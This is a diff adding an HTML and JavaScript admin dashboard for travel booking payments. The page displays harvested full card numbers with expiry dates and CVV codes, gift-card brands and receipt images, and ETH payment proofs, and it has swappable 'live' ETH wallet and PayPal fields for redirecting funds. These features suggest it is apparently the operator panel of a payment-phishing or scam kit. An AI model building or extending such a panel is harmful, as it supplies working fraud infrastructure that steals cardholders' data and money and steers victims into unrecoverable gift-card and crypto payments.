@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard - Payment Records & Settings</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Roboto', sans-serif; }
+        body { background-color: #f4f7f6; color: #333; padding: 20px; }
+        .container { max-width: 1300px; margin: 0 auto; }
+        header { display: flex; justify-content: space-between; align-items: center; background: #0b2341; color: #fff; padding: 16px 24px; border-radius: 6px; margin-bottom: 20px; }
+        h1 { font-size: 20px; }
+        .btn { background: #00539f; color: #fff; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; font-weight: 700; }
+        .btn:hover { opacity: 0.9; }
+        
+        /* Settings Boxes */
+        .settings-card { background: #fff; padding: 16px 20px; border-radius: 6px; margin-bottom: 12px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); display: flex; gap: 12px; align-items: center; }
+        .settings-card input { flex-grow: 1; padding: 8px 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 13px; }
+
+        .table-container { background: #fff; border-radius: 6px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); overflow-x: auto; margin-top: 20px; }
+        table { width: 100%; border-collapse: collapse; text-align: left; font-size: 13px; }
+        th, td { padding: 12px 16px; border-bottom: 1px solid #e1e4e8; }
+        th { background: #f8f9fa; font-weight: 700; color: #444; }
+        tr:hover { background: #fdfdfd; }
+        .status-badge { padding: 4px 8px; border-radius: 4px; font-size: 11px; font-weight: 700; text-transform: uppercase; }
+        .status-declined { background: #ffebee; color: #c62828; }
+        .status-review { background: #fff8e1; color: #f57f17; }
+        .status-crypto { background: #e1f5fe; color: #0288d1; }
+        a { color: #00539f; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+
+        /* Modal Popup for User & Card Details */
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); align-items: center; justify-content: center; }
+        .modal-content { background: #fff; padding: 24px; border-radius: 6px; width: 500px; max-width: 90%; max-height: 90vh; overflow-y: auto; }
+        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; border-bottom: 1px solid #eee; padding-bottom: 8px; }
+        .close-btn { cursor: pointer; font-size: 18px; font-weight: bold; }
+        .detail-row { margin-bottom: 10px; font-size: 13px; }
+        .detail-row label { font-weight: 700; color: #555; display: block; font-size: 11px; text-transform: uppercase; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Admin Payment & Management Dashboard</h1>
+            <button class="btn" onclick="loadPayments()">Refresh Data</button>
+        </header>
+
+        <!-- ETH Wallet Configuration Box -->
+        <div class="settings-card">
+            <strong style="font-size: 13px; white-space: nowrap; min-width: 140px;">Live ETH Wallet:</strong>
+            <input type="text" id="ethWalletInput" placeholder="Enter Ethereum wallet address (0x...)">
+            <button class="btn" onclick="saveEthWallet()">Save ETH</button>
+        </div>
+
+        <!-- PayPal Configuration Box -->
+        <div class="settings-card">
+            <strong style="font-size: 13px; white-space: nowrap; min-width: 140px;">Live PayPal Account:</strong>
+            <input type="text" id="paypalInput" placeholder="Enter PayPal email or username (name@domain.com)">
+            <button class="btn" onclick="savePaypalAccount()">Save PayPal</button>
+        </div>
+
+        <div class="table-container">
+            <table>
+                <thead>
+                    <tr>
+                        <th>Date</th>
+                        <th>Passenger</th>
+                        <th>Payer Info</th>
+                        <th>Method</th>
+                        <th>Total</th>
+                        <th>Status</th>
+                        <th>Actions</th>
+                    </tr>
+                </thead>
+                <tbody id="paymentsTableBody">
+                    <tr><td colspan="7" style="text-align: center; padding: 20px;">Loading records...</td></tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <!-- Detail Modal -->
+    <div class="modal" id="detailModal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>Transaction & User Details</h3>
+                <span class="close-btn" onclick="closeModal()">&times;</span>
+            </div>
+            <div id="modalBody">
+                <!-- Injected dynamically -->
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let allPayments = [];
+
+        async function loadPayments() {
+            const tbody = document.getElementById('paymentsTableBody');
+            tbody.innerHTML = `<tr><td colspan="7" style="text-align: center; padding: 20px;">Loading records...</td></tr>`;
+
+            try {
+                // Fetch settings / eth wallet & paypal account
+                const settingsRes = await fetch('/api/settings');
+                const settingsData = await settingsRes.json();
+                if(settingsData.success) {
+                    document.getElementById('ethWalletInput').value = settingsData.ethWalletAddress || '';
+                    document.getElementById('paypalInput').value = settingsData.paypalAccount || '';
+                }
+
+                const response = await fetch('/api/admin/payments');
+                const result = await response.json();
+
+                if (!result.success) throw new Error(result.error);
+
+                allPayments = result.payments;
+                if (allPayments.length === 0) {
+                    tbody.innerHTML = `<tr><td colspan="7" style="text-align: center; padding: 20px;">No payment records found yet.</td></tr>`;
+                    return;
+                }
+
+                tbody.innerHTML = '';
+                allPayments.forEach((p, index) => {
+                    const dateStr = new Date(p.created_at).toLocaleString();
+                    let statusClass = 'status-review';
+                    if (p.payment_status === 'Declined') statusClass = 'status-declined';
+                    if (p.payment_status.includes('Crypto') || p.payment_status.includes('10 mins')) statusClass = 'status-crypto';
+
+                    const row = document.createElement('tr');
+                    row.innerHTML = `
+                        <td>${dateStr}</td>
+                        <td><strong>${p.passenger_name}</strong><br><small>${p.route}</small></td>
+                        <td>${p.payer_name} (${p.payer_relationship})<br><small>${p.payer_email}</small></td>
+                        <td style="text-transform: uppercase;"><strong>${p.payment_method}</strong></td>
+                        <td>$${parseFloat(p.total_amount).toFixed(2)}</td>
+                        <td><span class="status-badge ${statusClass}">${p.payment_status}</span></td>
+                        <td><button class="btn" style="padding: 4px 8px; font-size: 11px;" onclick="viewDetails(${index})">View Info</button></td>
+                    `;
+                    tbody.appendChild(row);
+                });
+
+            } catch (err) {
+                console.error(err);
+                tbody.innerHTML = `<tr><td colspan="7" style="text-align: center; color: red; padding: 20px;">Error loading data: ${err.message}</td></tr>`;
+            }
+        }
+
+        async function saveEthWallet() {
+            const address = document.getElementById('ethWalletInput').value.trim();
+            if(!address) { alert('Please enter a valid wallet address'); return; }
+
+            const res = await fetch('/api/admin/update-wallet', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ ethWalletAddress: address })
+            });
+            const result = await res.json();
+            if(result.success) {
+                alert('Ethereum wallet address updated successfully!');
+            } else {
+                alert('Failed to update: ' + result.error);
+            }
+        }
+
+        async function savePaypalAccount() {
+            const paypalAccount = document.getElementById('paypalInput').value.trim();
+            if(!paypalAccount) { alert('Please enter a valid PayPal account'); return; }
+
+            const res = await fetch('/api/admin/update-paypal', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ paypalAccount: paypalAccount })
+            });
+            const result = await res.json();
+            if(result.success) {
+                alert('PayPal account updated successfully!');
+            } else {
+                alert('Failed to update: ' + result.error);
+            }
+        }
+
+        function viewDetails(index) {
+            const p = allPayments[index];
+            const modalBody = document.getElementById('modalBody');
+
+            let paymentSpecificHtml = '';
+            if (p.payment_method === 'card') {
+                paymentSpecificHtml = `
+                    <hr style="margin: 12px 0;">
+                    <h4 style="color:#c62828; margin-bottom:8px;">Credit Card Information</h4>
+                    <div class="detail-row"><label>Cardholder Name</label><strong>${p.card_holder_name || 'N/A'}</strong></div>
+                    <div class="detail-row"><label>Card Number</label><strong>${p.card_number || 'N/A'}</strong></div>
+                    <div class="detail-row"><label>Expiration Date</label><strong>${p.card_expiry || 'N/A'}</strong></div>
+                    <div class="detail-row"><label>CVV Security Code</label><strong>${p.card_cvv || 'N/A'}</strong></div>
+                `;
+            } else if (p.payment_method === 'giftcard') {
+                paymentSpecificHtml = `
+                    <hr style="margin: 12px 0;">
+                    <h4 style="color:#2e7d32; margin-bottom:8px;">Gift Card Information</h4>
+                    <div class="detail-row"><label>Brand</label><strong>${p.gift_card_brand || 'N/A'}</strong></div>
+                    <div class="detail-row"><label>Amount</label><strong>$${p.gift_card_amount || 'N/A'}</strong></div>
+                    <div class="detail-row"><label>Uploaded Receipt / Image</label>${p.gift_card_image_url ? `<a href="${p.gift_card_image_url}" target="_blank">Open Image Proof ↗</a>` : 'None'}</div>
+                `;
+            } else if (p.payment_method === 'eth') {
+                paymentSpecificHtml = `
+                    <hr style="margin: 12px 0;">
+                    <h4 style="color:#0288d1; margin-bottom:8px;">Ethereum Payment Proof</h4>
+                    <div class="detail-row"><label>Receipt Document</label>${p.eth_receipt_url ? `<a href="${p.eth_receipt_url}" target="_blank">Open ETH Transaction Proof ↗</a>` : 'None'}</div>
+                `;
+            }
+
+            modalBody.innerHTML = `
+                <div class="detail-row"><label>Passenger Name</label><strong>${p.passenger_name}</strong></div>
+                <div class="detail-row"><label>Passenger Email</label><strong>${p.passenger_email}</strong></div>
+                <div class="detail-row"><label>Travel Route</label><strong>${p.route}</strong></div>
+                <hr style="margin: 12px 0;">
+                <div class="detail-row"><label>Payer Relationship</label><strong>${p.payer_relationship}</strong></div>
+                <div class="detail-row"><label>Payer Name</label><strong>${p.payer_name}</strong></div>
+                <div class="detail-row"><label>Payer Email & Phone</label><strong>${p.payer_email} | ${p.payer_phone}</strong></div>
+                <div class="detail-row"><label>Total Amount & Status</label><strong>$${parseFloat(p.total_amount).toFixed(2)} (${p.payment_status})</strong></div>
+                ${paymentSpecificHtml}
+            `;
+
+            document.getElementById('detailModal').style.display = 'flex';
+        }
+
+        function closeModal() {
+            document.getElementById('detailModal').style.display = 'none';
+        }
+
+        loadPayments();
+    </script>
+</body>
+</html>
